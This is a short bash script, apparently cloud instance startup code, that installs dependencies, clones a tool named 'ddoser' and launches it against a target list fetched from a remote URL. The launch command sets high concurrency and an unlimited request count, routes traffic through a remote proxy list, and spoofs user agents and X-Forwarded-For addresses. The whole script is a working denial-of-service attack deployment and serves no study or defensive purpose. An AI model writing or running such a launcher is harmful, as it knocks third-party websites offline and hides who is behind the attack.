#!/bin/bash
set -x 
sudo systemctl start amazon-ssm-agent
# Ubuntu 20 uses snap
sudo snap start amazon-ssm-agent
# MAX_TIME=20
# MIN_TIME=13
# DIFF=$(($MAX_TIME-$MIN_TIME+1))
# R=$(($(($RANDOM%$DIFF))+$MIN_TIME))
# sudo shutdown +$R
yum install -y python3-pip git htop
ulimit -n 100000
git clone https://github.com/taransergey/ddoser.git
cd ddoser/
pip3 install -r requirements.txt
python3 ./ddoser.py --target-urls-file https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt --concurrency 350 --timeout 20 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --proxy-url 'http://143.244.166.15/proxy.list' --restart-period 600 --random-xff-ip